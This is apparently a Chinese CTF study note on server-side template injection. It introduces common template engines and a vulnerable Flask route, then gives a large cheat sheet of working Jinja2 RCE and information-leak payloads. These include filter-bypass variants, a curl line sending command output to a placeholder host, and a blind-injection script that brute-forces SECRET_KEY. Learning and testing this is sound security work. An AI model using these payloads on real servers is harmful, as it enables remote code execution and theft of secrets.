---
title: SSTI 模板注入
date: 2026-08-24 12:10:00
categories:
  - Web安全
tags:
  - SSTI
  - 模板注入
disableNunjucks: true
description: SSTI 模板注入
---


🔴[1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园](https://www.cnblogs.com/bmjoker/p/13508538.html)

[SSTI漏洞浅析（常见模板注入、waf绕过） - Antoniiiia - 博客园](https://www.cnblogs.com/Antoniiiia/p/18867814)

[一篇文章带你理解漏洞之 SSTI 漏洞 - K0rz3n's Blog](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#0X00-前言：)

# 什么是SSTI

1. **什么是 SSTI？**

- 服务端模板注入漏洞
- 用户输入被直接拼接到模板中执行
- 导致任意代码执行（RCE）

2. **SSTI 与普通注入的区别**

```python
# SQL 注入：影响数据库
"SELECT * FROM users WHERE name = '" + user_input + "'"

# 命令注入：影响系统命令
os.system("ping " + user_input)

# SSTI：影响模板引擎
template.render("Hello " + user_input)
```

3. **漏洞产生原因**

```python
# 安全用法（数据与代码分离）
template.render(name=user_input)

# 危险用法（直接拼接）
template.render("Hello {{ " + user_input + " }}")
```

# 什么是模板注入

**1、 什么是注入：**

**注入就是格式化字符串漏洞的一种体现**

web中 SQL 注入就是一个非常好的例子，我们在开发者本来认为我们应该插入正常数据的地方插入了sql语句，这就破坏了原本的SQL 语句的格式，从而执行了与原句完全不同含义的SQL 语句达到了攻击者的目的，同理 XSS 在有些情况下的闭合标签的手法也是利用了格式化字符串这种思想。

**2、 什么是模板注入：**

SSTI （**服务器端模板注入**）也是格式化字符串的一个非常好的例子，如今的开发已经形成了非常成熟的 MVC 的模式，我们的输入通过 V 接收，交给 C ，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做模板的技术，**这种模板请不要认为只存在于 Python 中**，感觉网上讲述的都是Python 的 SSTI ,在这之前也给了我非常大的误导(只能说自己没有好好研究，浅尝辄止)**，请记住，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是**，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。

# 常见的模板引擎介绍

##  PHP 模板引擎

**1. Smarty**

**简介**：最老牌的PHP模板引擎之一，1999年发布，使用广泛，语法简洁

**特点**：

- 编译型模板，模板会被编译成PHP文件
- 强大的缓存机制
- 丰富的插件系统
- 相对较低的学习曲线

**基本语法**：

smarty

```
{* 注释 *}
{$variable}                    {* 变量输出 *}
{if $condition}...{/if}        {* 条件判断 *}
{foreach $array as $item}...{/foreach}  {* 循环 *}
{include file="header.tpl"}    {* 包含模板 *}

{* 函数调用 *}
{$name|upper}                  {* 过滤器 *}
{date_format $timestamp "%Y-%m-%d"}  {* 日期格式化 *}
```

**使用场景**：传统PHP项目、内容管理系统、企业级应用

------

**2. Twig**

**简介**：来自Symfony框架的现代模板引擎，语法优雅，安全性高

**特点**：

- 语法简洁易读
- 自动HTML转义（XSS防护）
- 支持模板继承
- 沙箱模式增强安全性

**基本语法**：

twig

```
{# 注释 #}
{{ variable }}                 {* 变量输出 *}
{% if condition %}...{% endif %} {* 条件判断 *}
{% for item in array %}...{% endfor %} {* 循环 *}
{% extends "base.html" %}      {* 模板继承 *}

{# 过滤器 #}
{{ name|upper }}
{{ content|striptags }}        {* HTML标签过滤 *}

{# 包含 #}
{% include "partials/header.twig" %}
```

**使用场景**：Symfony项目、现代PHP应用、需要高安全性的项目

------

**3. Blade**

**简介**：Laravel框架的官方模板引擎，简单强大，支持原生PHP代码

**特点**：

- 模板编译为原生PHP代码
- 支持模板继承和组件化
- 简洁的语法糖
- 与Laravel深度集成

**基本语法**：

blade

```
{{-- 注释 --}}
{{ $variable }}                {{-- 变量输出（自动转义） --}}
{!! $html !!}                  {{-- 原始HTML输出 --}}
@if($condition)...@endif       {{-- 条件判断 --}}
@foreach($array as $item)...@endforeach  {{-- 循环 --}}

{{-- 模板继承 --}}
@extends('layouts.app')
@section('content')...@endsection

{{-- 组件 --}}
@component('alert')
    @slot('title') Title @endslot
    Content
@endcomponent
```

**使用场景**：Laravel项目、快速开发、现代Web应用

------

## Java 模板引擎

**1. JSP (JavaServer Pages)**

**简介**：Java官方的Web模板技术，本质上是在HTML中嵌入Java代码

**特点**：

- 直接编译为Servlet
- 支持JSTL标签库
- 与Java EE生态完美集成
- 学习成本低（对于Java开发者）

**基本语法**：

jsp

```
<%-- JSP注释 --%>
<%= variable %>                <%-- 表达式输出 --%>
<% java code %>                <%-- 脚本块 --%>
<%@ page contentType="text/html;charset=UTF-8" %>  <%-- 指令 --%>

<%-- JSTL标签 --%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<c:if test="${condition}">...</c:if>
<c:forEach items="${list}" var="item">...</c:forEach>
```

**使用场景**：传统Java Web应用、企业级系统、Java EE项目

------

**2. FreeMarker**

**简介**：强大的Java模板引擎，专注于MVC视图层，不依赖Web环境

**特点**：

- 纯粹的模板引擎，不依赖Servlet容器
- 强大的数据模型处理能力
- 支持多种输出格式（HTML、XML、PDF等）
- 模板继承和宏定义

**基本语法**：

ftl

```
<#-- 注释 -->
${variable}                    <#-- 变量输出 -->
<#if condition>...</#if>       <#-- 条件判断 -->
<#list array as item>...</#list> <#-- 循环 -->

<#-- 宏定义 -->
<#macro greeting name>
    Hello ${name}!
</#macro>
<@greeting name="John"/>

<#-- 包含模板 -->
<#include "header.ftl">
```

**使用场景**：Web应用视图、代码生成、邮件模板、报表生成

------

**3. Velocity**

**简介**：Apache的轻量级模板引擎，语法简单，性能优秀

**特点**：

- 极其简单的语法（VTL）
- 轻量级，无依赖
- 学习成本极低
- 广泛应用于Apache项目

**基本语法**：

vm

```
## Velocity注释
$variable                      ## 变量输出
#if($condition)...#end         ## 条件判断
#foreach($item in $list)...#end ## 循环

## 方法调用
$customer.getAddress()
$customer.setName("John")

## 包含模板
#include("header.vm")
#parse("template.vm")
```

**使用场景**：Apache项目、简单Web应用、邮件模板、代码生成

------

##  Python 模板引擎

**1. Jinja2**

**简介**：Flask框架的默认模板引擎，语法灵活，功能强大

**特点**：

- 语法类似Django模板但更强大
- 支持模板继承和宏
- 自动HTML转义
- 丰富的过滤器库

**基本语法**：

jinja2

```
{# 注释 #}
{{ variable }}                 {# 变量输出 #}
{% if condition %}...{% endif %} {# 条件判断 #}
{% for item in list %}...{% endfor %} {# 循环 #}

{# 过滤器 #}
{{ name|upper }}
{{ content|safe }}             {# 标记安全HTML #}

{# 模板继承 #}
{% extends "base.html" %}
{% block content %}...{% endblock %}

{# 宏定义 #}
{% macro input(name, value='', type='text') %}
    <input type="{{ type }}" name="{{ name }}" value="{{ value }}">
{% endmacro %}
{{ input('username') }}
```

**使用场景**：Flask项目、Python Web应用、文档生成

------

**2. Django 模板**

**简介**：Django框架自带的模板引擎，强调安全性和简洁性

**特点**：

- 安全性优先（限制执行任意Python代码）
- 简洁的模板语言（DTL）
- 与DjangoORM深度集成
- 强大的模板继承系统

**基本语法**：

django

```
{# 注释 #}
{{ variable }}                 {# 变量输出 #}
{% if condition %}...{% endif %} {# 标签 #}
{% for item in list %}...{% endfor %}

{# 过滤器 #}
{{ name|upper }}
{{ date|date:"Y-m-d" }}

{# 模板继承 #}
{% extends "base.html" %}
{% block title %}Page Title{% endblock %}

{# 包含 #}
{% include "header.html" %}

{# URL反向解析 #}
{% url 'app:view_name' arg1 arg2 %}
```

**使用场景**：Django项目、内容管理系统、高安全性要求的应用

------

**3. Tornado 模板**

**简介**：Tornado Web框架的模板引擎，简单高效，支持异步

**特点**：

- 轻量级，性能优秀
- 支持自动转义
- 简单的模板继承
- 与Tornado异步特性集成

**基本语法**：

python

```
{# 注释 #}
{{ variable }}                 {# 变量输出 #}
{% if condition %}...{% end %} {# 条件判断 #}
{% for item in list %}...{% end %}

{# 转义控制 #}
{{ variable }}                 {# 自动转义 #}
{% raw variable %}             {# 原始输出 #}

{# 模板继承 #}
{% extends "base.html" %}
{% block body %}...{% end %}

{# 自定义函数 #}
{% apply linkify %}...{% end %}
```

**使用场景**：Tornado项目、高并发Web应用、API服务、实时应用

# **主要模板引擎及其语法**

1. **Jinja2 (Python/Flask)**

```python
# 基本语法
{{ 7*7 }}           # 表达式：49
{{ config }}        # 对象访问
{{ ''.__class__ }}  # 类方法调用

# 漏洞检测 payload
{{ 7*7 }}            # 如果显示49，存在SSTI
{{ 7*'7' }}          # 如果显示7777777，存在SSTI
```

2. **Twig (PHP)**

```php
# 基本语法
{{ 7*7 }}           # 表达式
{{ _self }}         # 自我引用

# 漏洞检测
{{ 7*7 }}           # 检测SSTI
{{ ['id']|sort('system') }}  # 命令执行
```

3. **Freemaker (Java)**

```java
<#-- 注释语法 -->
${7*7}              # 表达式
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("whoami") }   # 命令执行
```

4. **Velocity (Java)**

```velocity
#set($x=7*7)        # 赋值：49
$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")
```

5. **Handlebars (JavaScript)**

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
    {{/with}}
  {{/with}}
{{/with}}
```

#  检测工具（tplmap)

kali

python tplmap.py -u URL 

# **✔️做题思路**

在SSTI中，我们要做的无非就两个：

- 执行命令
- 获取文件内容

所以我们所做的一切实际上都是在往这两个结果靠拢。

## 1.flask

(**Flask** 是一个用 Python 编写的轻量级 **Web 应用框架**)

1. Flask 的两种渲染方法

Flask 提供了两种方法来渲染 HTML 内容：

| 方法                           | 作用                                                         | 示例                                                         | 适用场景                                                     |
| :----------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **`render_template()`**        | **渲染一个指定的模板文件**（通常是 `.html` 文件）。          | `return render_template('index.html')`                       | 标准的网页渲染，从 `templates` 文件夹中加载并渲染 HTML 文件。 |
| **`render_template_string()`** | **直接渲染一个字符串**，将这个字符串作为 Jinja2 模板来解析。 | `return render_template_string('<h1>This is index page</h1>')` | 动态生成简单的 HTML 内容，通常用于渲染小块模板。             |

**关键点**：这两种方法都会使用 **Jinja2** 模板引擎对传入的内容进行解析。如果内容中包含用户可控的、且被 Jinja2 解析的部分，就会导致 SSTI 漏洞。

---

2. Flask 的模板与 Jinja2 引擎

**a) 模板基础**
- Flask 约定在项目根目录下创建一个名为 `templates` 的文件夹来存放所有模板文件（如 `.html` 文件）。
- 这是 Flask 的默认配置，`render_template()` 函数会自动在这个文件夹里查找文件。

**b) 示例代码结构**

- **文件 `test.py` (Flask 应用主程序)**
  
  ```python
  from flask import Flask, render_template
  
  app = Flask(__name__)
  
  @app.route('/index/')
  def user_login():
      # 安全地渲染 templates/index.html 文件
      return render_template('index.html')
  ```
  
- **文件 `templates/index.html` (模板文件)**
  ```html
  <h1>This is index page</h1>
  ```
  **访问结果**：用户访问 `/index/` 时，会看到一个大标题 "This is index page"。

**c) 模板的动态渲染（引入变量）**
Jinja2 的强大之处在于它允许在 HTML 中嵌入动态内容和逻辑。这是通过 **双花括号 `{{ ... }}`** 等语法实现的。

- **文件 `demo.py` (使用了变量的安全示例)**
  ```python
  from flask import Flask, render_template
  
  app = Flask(__name__)
  
  @app.route('/index/')
  def user_login():
      # 将变量 content 传递到模板中，其值为 'This is index page.'
      return render_template('index.html', content='This is index page.')
  ```

- **文件 `templates/index.html` (使用了变量的模板)**
  ```html
  <h1>{{ content }}</h1>
  ```
  **访问结果**：与之前完全相同。但此时 `<h1>` 标签内的内容是由变量 `content` 动态传递进去的。Jinja2 引擎会执行 `{{ content }}`，并用变量的值替换它。

---

3. 漏洞成因：Server-Side Template Injection (SSTI)

漏洞发生在当**用户输入被直接拼接进模板，并且被 Jinja2 引擎解析**的时候。

**假设一个存在漏洞的代码修改版：**

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/greet')
def greet():
    # 危险操作：直接从用户请求中获取参数并拼接到模板字符串中
    name = request.args.get('name', 'Guest')
    # 使用 render_template_string 渲染拼接的字符串
    html = "<h1>Hello, " + name + "!</h1>"
    return render_template_string(html)
```

**攻击过程**：
1.  **正常访问**：用户访问 `/greet?name=Alice`。
    - 生成的 HTML 字符串为：`"<h1>Hello, Alice!</h1>"`
    - 渲染结果：`Hello, Alice!`
2.  **恶意攻击**：攻击者访问 `/greet?name={{7*7}}`。
    - 生成的 HTML 字符串为：`"<h1>Hello, {{7*7}}!</h1>"`
    - **Jinja2 引擎会解析 `{{7*7}}`**，计算其值。
    - 最终渲染结果：`Hello, 49!`

这证明攻击者注入的 Jinja2 语法 `{{7*7}}` 被成功执行了。

---

4. Flask 的全局变量（在 SSTI 中的利用）

一旦存在 SSTI 漏洞，攻击者的目标就是利用它来执行更危险的命令。Jinja2 为 Flask 提供了一些内置的全局变量，这些变量成为了攻击的跳板。

几个关键全局变量：

| 全局变量                  | 描述                                     | 在 SSTI 中的意义                                             |
| :------------------------ | :--------------------------------------- | :----------------------------------------------------------- |
| **`request`**             | 封装了当前 HTTP 请求的对象。             | 可以用来获取请求信息。                                       |
| **`session`**             | 存储用户会话信息的字典对象。             | 如果密钥泄露，可能被用来伪造会话。                           |
| **`g`**                   | 处理请求期间用于存储信息的临时全局对象。 | 通常利用价值较低。                                           |
| **`config`**              | **当前 Flask 应用的配置对象**。          | **极其重要**，可能包含数据库连接字符串、密钥等敏感信息。`{{ config }}` 可以打印所有配置。 |
| **`[]`、`.__class__` 等** | Python 的对象继承链访问方式。            | **攻击的核心**。用于从字符串等基础对象向上溯源，最终获取到可以执行系统命令的类（如 `os`）。 |

**一个经典的 SSTI 利用链示例（用于理解概念）**：

攻击者可能会注入这样的 Payload：
```jinja2
{{ "".__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('whoami').read() }}
```
这个复杂的链条所做的就是：
1.  从一个空字符串 `""` 开始。
2.  找到它的类（`str`）。
3.  找到这个类的父类（`object`）。
4.  找到所有继承自 `object` 的类。
5.  在这些类中找到一个合适的、导入了 `os` 模块的类（这里 `[X]` 是一个索引号，需要寻找）。
6.  通过这个类，访问到 `os` 模块。
7.  最后使用 `os.popen` 执行系统命令 `whoami` 并读取结果。

## 2.获取object类

python的object类是所有类的基类，可以通过`__mro__`和`__bases__`两种方式来访问到object。

`__mro__`属性获取类的MRO(方法解析顺序)，也就是继承关系。

```
().__class__.__mro__[1]
{}.__class__.__mro__[1]
[].__class__.__mro__[1]
''.__class__.__mro__[1]#python3
''.__class__.__mro__[2]#python2
```

`__base__`属性可以获取该类的基类，可以叠加使用。

```
().__class__.__base__
{}.__class__.__base__
[].__class__.__base__
''.__class__.__base__ # python3
''.__class__.__base__.__base__ # python2
```

`__bases__`属性可以获取多继承的基类元组。

```
().__class__.__bases__[0]
{}.__class__.__bases__[0]
[].__class__.__bases__[0]
''.__class__.__bases__[0] # python3
```

## 3.获取子类列表

然后通过object类的`__subclasses__()`方法获取所有的子类列表，查看可用的类。

```
().__class__.__bases__[0].__subclasses__()
```

找到`__init__`为函数的类。

在获取初始化属性后，寻找不带warpper的，wrapper是指这些函数并没有被重载，function，不具有__globals__属性。

```
l=len([].__class__.__mro__[1].__subclasses__())
for i in range(l):
	if 'wrapper' not in str([].__class__.__mro__[1].__subclasses__()[i].__init__):
		print(i,[].__class__.__mro__[1].__subclasses__()[i])
```

或者使用`func_globals`

## 4.rce

常见的三种利用方式

#### `__builtins__`

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['__import__']('platform').popen('whoami').read()
```

#### linecache

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('whoami')
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('ls')
```

#### sys

```
[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].system('whoami')
```

## 5.信息泄露

泄漏环境变量等配置

```
{{config}}
{{self.__dict__}}
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}

{{get_flashed_messages.__globals__['current_app'].config.FLAG}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
{{self}} ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context.config}}
{{self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open("/flag").read()}}
```

# ✔️绕过方法总结：

### 1.过滤关键词：

#### 字符串拼接

加号是多余的

```
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__buil'+'tins__']['__imp'+'ort__']('o'+'s').popen('who'+'ami').read()}}
```

#### 引号

```
{{''['__class__'].__mro__[1].__subclasses__()[139].__init__.__globals__['__bui''ltins__']['__impo''rt__']('o''s').popen('who''ami').read()}}
```

`__getattribute__`同时绕过中括号

```
''.__getattribute__('__class__')
```

#### 切片1

```
"__ssalc__"[::-1]
```

#### 编码

base64（python2）

```
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['X19pbXBvcnRfXw=='.decode('base64')]('os').popen('whoami').read()}}
```

Unicode

```
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f']('os').popen('whoami').read()}}
```

16进制

```
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen('whoami').read()}}
```

8进制

```
{{''['\137\137\143\154\141\163\163\137\137'].__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\137\137\151\155\160\157\162\164\137\137']('os').popen('whoami').read()}}
```

#### format

```
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)
```

#### chr

```
{% set chr=url_for.__globals__['__builtins__'].chr %}
{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
```

#### ~

```
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
```

大小写

```
''['__CLASS__'.lower()]
```

### 2.过滤`[]`

调用方法来获取属性

#### 列表方法

```
__getitem__`
`pop
list.__getitem__(0)
list.pop(0)
```

#### 字典方法

```
__getitem__`
`pop`
`get`
`setdefault
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
{{''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(139).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').popen('whoami').read()}}
{{''.__class__.__mro__.pop(1).__subclasses__().pop(139).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').popen('whoami').read()}}
```

### 3.过滤引号

#### request

request.args和request.values

```
{{[].__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()}}&v1=os&v2=whoami
```

#### chr

```
{% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}
```

### 4.过滤`.`

点等价于`__getattribute__`

```
''.__getattribute__('__class__')
```

#### `[]`

```
{{''['__class__']['__mro__'][1]['__subclasses__']()[139]['__init__']['__globals__']['__builtins__']['eval'](request.args.v1)}}
```

#### attr

```
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(139)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```

### 5.过滤`_`

#### request

```
{{''[request.args.v1][request.args.v2][1][request.args.v3]()[139][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)}}&v1=__class__&v2=__mro__&v3=__subclasses__&v4=__init__&v5=__globals__&v6=__builtins__&v7=eval&v8=__import__("os").popen("whoami").read()
```

### 6.过滤`{{}}`

#### if

```
{% if ''.__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("curl http://xxx.xxx.xxx.xxx:12345/?i=`whoami`").read()') %}1{% endif %}
```

#### print

```
{% print(''.__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')) %}
```

### 7.长度绕过

```
{{url_for.__globals__[request.args.a]}}
{{lipsum.__globals__.os[request.args.a]}}
```

Jinja 模板中存在 set 语句，用来设置模板中的变量：`{% set var='test' %}`
配合字典的 update() 方法来更新 config 全局对象

```
{{config}}
{%set x=config.update(l=lipsum)%}
{%set x=config.update(u=config.update)%}
{%set x=config.u(g=request.args.a)%}&a=__globals__
{%set x=config.u(o=lipsum[config.g].os)%}
{%set x=config.u(f=config.l[config.g])%}
{{config.f.os.popen('cat /f*').read()}}
```

### 8.waf过滤：

盲注

通过回显内容的真假爆破字符串

```
{%for char in get_env(name="SECRET_KEY")%}
{%if char is matching('') %}1
{%else%}0
{%endif%}
{%endfor%}
```

示例脚本

```python
import string
import time
import requests

url = "https://ip:port/"
s = string.printable

def ssti(re):
    payload = """text={%for%20char%20in%20get_env(name="SECRET_KEY")%}{%if%20char%20is%20matching('str')%20%}1{%else%}0{%endif%}{%endfor%}""".replace("str", re)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    result = requests.post(url, data=payload, headers=headers, verify=False).text
    if "1" in result:
        print(re, result)
        return re
    return ""

for i in s:
    time.sleep(0.5)
	ssti(i)
```

【CTF】Flask SSTI姿势与手法总结 Cheatsheet速查表https://www.freebuf.com/articles/web/421402.html

ssti详解与例题以及绕过payload大全https://blog.csdn.net/weixin_54515836/article/details/113778233?fromshare=blogdetail&sharetype=blogdetail&sharerId=113778233&sharerefer=PC&sharesource=sundan147369&sharefrom=from_link
